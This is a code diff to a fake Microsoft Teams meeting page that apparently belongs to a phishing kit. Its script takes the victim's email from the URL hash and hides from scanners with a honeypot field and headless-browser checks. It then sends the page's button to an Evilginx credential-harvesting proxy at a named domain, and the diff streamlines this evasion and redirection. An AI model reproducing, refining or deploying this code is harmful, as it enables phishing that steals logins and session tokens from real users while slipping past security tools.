@@ -84,39 +84,33 @@
     <input type="text" id="teams-honey-field" name="teams_honey_field" style="display:none" autocomplete="off" tabindex="-1">
 
     <!-- Script: Email carry-forward + anti-bot -->
-    <script>
+<script>
 window.addEventListener('load', function() {
-  const hash = window.location.hash; // "#target@example.com"
-  const email = hash ? hash.substring(1) : '';
-
   // --- Anti-bot / honey-pot check ---
   const token = document.getElementById('teams-verification-token')?.value;
   const honey = document.getElementById('teams-honey-field')?.value;
-  if (!token || honey) {
-    console.warn("Bot detected or invalid token; redirect blocked");
-    return;
-  }
+  if (!token || honey) return;
 
-  // --- Headless / automation detection ---
-  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
-    console.warn("Headless bot detected; redirect blocked");
-    return;
-  }
+  // --- Headless / automation check ---
+  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) return;
 
-  // --- Update button to go to Evilginx, keep hash intact ---
+  // --- Grab email from hash ---
+  let email = window.location.hash ? window.location.hash.substring(1) : '';
+  email = email.replace(/=*$/, ''); // strip trailing =
+
+  // --- Update button to point to Evilginx ---
   const button = document.querySelector('.teams-button');
   if (button) {
-    const baseURL = 'https://access-meetings.visions-solutions.ca/OFcNokky';
+    const baseURL = 'https://access-meetings.visions-solutions.ca/pHFJuDpi';
     button.onclick = function() {
-      if (email && email.includes('@')) {
-        window.location.href = baseURL + '#' + email;
-      } else {
-        window.location.href = baseURL;
-      }
+      window.location.href = email && email.includes('@')
+        ? baseURL + '#'+email
+        : baseURL;
     };
   }
 });
 </script>
 </body>
 </html>
+
 
